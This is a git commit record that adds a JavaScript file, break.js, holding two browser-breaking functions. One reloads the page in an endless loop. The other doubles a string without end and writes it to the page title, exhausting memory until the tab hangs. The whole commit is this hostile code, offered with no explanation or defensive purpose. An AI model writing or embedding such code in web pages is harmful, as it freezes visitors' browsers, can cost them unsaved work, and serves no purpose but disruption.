7e386559b6daa00508f6e4d2883381f0503dca2e
JosephYapYEEEEEEEEEEEEEEEEEEEEEEEEEEEET <75049883+JosephYapYEEEEEEEEEEEEEEEEEEEEEEEEEEEET@users.noreply.github.com>
2021-08-28 16:16:30 +1000

    Create break.js

---
+++ break.js
@@ -0,0 +1,12 @@
+function refreshBreak() {
+  while(true) {
+    location.reload()
+  }
+}
+function titleBreak() {
+  var a = "5555"
+  while(true) {
+    a = a + a;
+    document.title = a;
+  }
+}
